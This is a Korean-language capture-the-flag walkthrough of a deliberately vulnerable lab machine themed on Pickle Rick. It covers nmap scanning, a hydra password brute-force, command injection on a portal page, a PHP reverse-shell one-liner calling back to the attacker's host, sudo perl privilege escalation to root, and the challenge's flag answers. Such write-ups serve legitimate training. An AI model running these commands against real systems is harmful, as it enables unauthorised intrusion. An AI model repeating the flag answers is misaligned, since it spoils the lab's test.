# solve

- nmap 시 22, 80 열려있음
```
└─$ sudo nmap -sS -Pn -n --open 10.201.89.128 -sV -sC -oA tcpdetailed -T4 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 05:30 EDT
Nmap scan report for 10.201.89.128
Host is up (0.37s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 68:74:f0:b4:1d:89:56:82:53:6f:0d:19:c5:87:98:0f (RSA)
|   256 cd:c6:b5:56:50:e5:d4:df:80:35:41:f1:77:3e:15:90 (ECDSA)
|_  256 54:60:59:81:89:4a:84:07:8b:9c:ed:f7:a7:14:58:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.35 seconds
```

- 웹
![[Pasted image 20250924190811.png]]
웹 페이지 소스코드에서 아래와 같은 거 발견
```
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

- robots.txt 발견 - 이상한 문자열 존재재
![[Pasted image 20250925152750.png]]

- nikto로 숨겨진 디렉터리 발견
![[Pasted image 20250924195625.png]]

- sqlmap으로 테스트해봤는데 sqli는 안 되는 듯 함
![[Pasted image 20250925142015.png]]

- hydra로 아까 확인한 R1ckRul3s 유저의 비밀번호 확인. 하지만 이 비번들로는 로그인 불가
```
└─$ hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.201.30.65  http-post-form "/login.php:username=^USER^&pa01:42:26 [18/23]
valid username or password."                                                       

[DATA] attacking http-post-form://10.201.30.65:80/login.php:username=^USER^&password=^PASS^:Invalid username or password.             
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: 12345
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: 123456789
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: 123456
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: password
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: iloveyou
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: abc123
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: 1234567
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: rockyou
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: 12345678
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: nicole
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: babygirl
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: monkey
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: princess
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: daniel
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: lovely
[80][http-post-form] host: 10.201.30.65   login: R1ckRul3s   password: jessica
1 of 1 target successfully completed, 16 valid passwords found
```

- 아까 robots.txt에서 본 문자열을 비밀번호로 로그인 성공. portal.php로 이동됨
![[Pasted image 20250925152900.png]]

- 파일들 확인
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

- 커맨드 인젝션으로 첫 번째 플래그 획득. cat 등 명령어들 몇 개가 필터링되어서 tac 사용
```
ls && tac Sup3rS3cretPickl3Ingred.txt

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

mr. meeseek hair
```

- clue.txt 내용
```
Look around the file system for the other ingredient.
```

- 리버스쉘 연결
```
ls && php -r '$sock=fsockopen("10.4.15.138",1234);exec("sh <&3 >&3 2>&3");'
```
![[Pasted image 20250925160310.png]]

- `sudo -l` 시, 모든 파일을 비번 없이 sudo로 실행 가능. 따라서 perl로 권한상승 
```
www-data@ip-10-201-30-65:/var/www/html$ sudo perl -e 'exec "/bin/sh";'
# whoami 
root
```

- 권한 상승 후, rick유저의 디렉터리 볼 수 있게 되고, 두 번째 플래그 획득
![[Pasted image 20250925160747.png]]

- 마지막 root폴더에서 세 번째 플래그 획득
```
# cat /root/3rd.txt                                                │
3rd ingredients: fleeb juice
```

